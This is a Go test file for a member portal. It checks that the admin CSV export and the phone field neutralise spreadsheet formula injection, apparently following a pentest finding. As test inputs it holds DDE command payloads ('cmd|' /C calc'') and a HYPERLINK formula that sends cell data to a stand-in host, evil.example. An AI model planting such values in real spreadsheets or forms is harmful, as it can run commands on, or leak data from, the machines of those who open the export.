package handler

import (
	"bytes"
	"encoding/csv"
	"net/http"
	"net/url"
	"testing"

	"github.com/go-chi/chi/v5"
)

func TestCSVText(t *testing.T) {
	tests := map[string]string{
		// Formulas, including the pentest's =1+1 and a DDE payload.
		"=1+1":                   "'=1+1",
		`=HYPERLINK("http://x")`: `'=HYPERLINK("http://x")`,
		"@SUM(A1)":               "'@SUM(A1)",
		"+cmd|' /C calc'!A0":     "'+cmd|' /C calc'!A0",
		"-2+3+cmd|' /C calc'!A0": "'-2+3+cmd|' /C calc'!A0",
		"\t=1+1":                 "'\t=1+1",
		"\r=1+1":                 "'\r=1+1",
		"=evil@example.com":      "'=evil@example.com",
		// Phone numbers and ordinary text stay as they are.
		"+420 777 123 456":         "+420 777 123 456",
		"777 123 456":              "777 123 456",
		"-":                        "-",
		"Jan Novák":                "Jan Novák",
		"jan.novak+portal@mail.cz": "jan.novak+portal@mail.cz",
		"":                         "",
	}
	for in, want := range tests {
		if got := csvText(in); got != want {
			t.Errorf("csvText(%q) = %q, want %q", in, got, want)
		}
	}
}

// The member export goes to spreadsheets, and members choose their phone,
// name, username and e-mail (pentest F-03).
func TestMemberExportHasNoFormulas(t *testing.T) {
	e := newAccessEnv(t)
	admin, _ := e.user("admin", "accepted", []string{"memberportal_admin"})
	_, id := e.user("member", "accepted", nil)
	if _, err := e.database.Exec(
		`UPDATE users SET phone = ?, realname = ?, username = ?, email = ? WHERE id = ?`,
		`=HYPERLINK("https://evil.example/?"&A1,"Klikni")`, "@SUM(1+1)", "-2+3+cmd|' /C calc'!A0", "=x@base48.cz", id,
	); err != nil {
		t.Fatal(err)
	}
	e.router.(*chi.Mux).Get("/admin/users/export.csv", e.h.RequireAdmin(e.h.AdminUsersCSVExportHandler))

	rec := e.do(admin, http.MethodGet, "/admin/users/export.csv", "")
	if rec.Code != http.StatusOK {
		t.Fatalf("export = %d", rec.Code)
	}
	rows, err := csv.NewReader(bytes.NewReader(bytes.TrimPrefix(rec.Body.Bytes(), []byte("\xef\xbb\xbf")))).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, row := range rows[1:] {
		if row[1] != "" && row[5] == "'=x@base48.cz" {
			found = true
		}
		for i, cell := range row {
			if cell != "" && (cell[0] == '=' || cell[0] == '@' || (cell[0] == '-' && len(cell) > 1) || cell[0] == '\t') {
				t.Errorf("row %v column %s starts a formula: %q", row[1], rows[0][i], cell)
			}
		}
	}
	if !found {
		t.Errorf("member row missing or e-mail not neutralised: %v", rows)
	}
}

func TestProfilePhoneIsAPhoneNumber(t *testing.T) {
	e := newAccessEnv(t)
	member, id := e.user("member", "accepted", nil)

	for _, bad := range []string{"=1+1", `=HYPERLINK("x")`, "@SUM(1)", "+420 777 123 456 (večer)", "123456789012345678901234567890123"} {
		form := "phone=" + url.QueryEscape(bad) + "&alt_contact="
		if rec := e.do(member, http.MethodPost, "/profile", form); rec.Code != http.StatusBadRequest {
			t.Errorf("phone %q = %d, want 400", bad, rec.Code)
		}
	}
	var stored *string
	e.database.QueryRow(`SELECT phone FROM users WHERE id = ?`, id).Scan(&stored)
	if stored != nil {
		t.Fatalf("an invalid phone was stored: %q", *stored)
	}

	for _, good := range []string{"+420 777 123 456", "(+420) 777-123-456", "777/123.456", ""} {
		form := "phone=" + url.QueryEscape(good) + "&alt_contact=" + url.QueryEscape("Signal: @nick")
		if rec := e.do(member, http.MethodPost, "/profile", form); rec.Code != http.StatusSeeOther {
			t.Errorf("phone %q = %d, want 303", good, rec.Code)
		}
	}
}
